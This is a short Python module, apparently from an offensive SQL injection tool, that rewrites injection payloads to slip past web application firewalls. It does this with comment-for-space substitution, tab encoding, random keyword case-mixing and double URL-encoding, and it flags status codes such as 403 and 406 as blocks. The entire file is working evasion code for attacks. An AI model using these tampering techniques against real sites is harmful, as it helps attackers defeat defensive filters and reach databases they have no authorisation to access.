"""SV1 - payload tampering.

Some filters match on the literal payload instead of parsing the request.
Change the shape, keep the meaning: comment out spaces, flip case, wrap the
quote. Every variant is still a valid injection if the backend is careless.
"""

from __future__ import annotations

import random
import urllib.parse

WAF_STATUS = (403, 406, 419, 429, 501, 503)


def blocked(status: int) -> bool:
    return status in WAF_STATUS


def variants(payload: str) -> list[str]:
    """Ordered encodings, cheapest first, duplicates removed."""
    options = [
        payload,
        payload.replace(" ", "/**/"),
        payload.replace(" ", "%09"),
        _case(payload),
        payload.replace(" ", "/**_**/"),
        urllib.parse.quote(payload, safe=""),
        urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
    ]
    seen: set[str] = set()
    ordered: list[str] = []
    for option in options:
        if option in seen:
            continue
        seen.add(option)
        ordered.append(option)
    return ordered


def _case(payload: str) -> str:
    """Randomly alternate case on SQL keywords only, so literals stay valid."""
    words = ("select", "union", "order", "by", "and", "or", "sleep", "version")
    result = payload
    for word in words:
        position = result.lower().find(word)
        if position < 0:
            continue
        mixed = "".join(
            char.upper() if random.random() < 0.5 else char.lower() for char in word
        )
        result = result[:position] + mixed + result[position + len(word):]
    return result
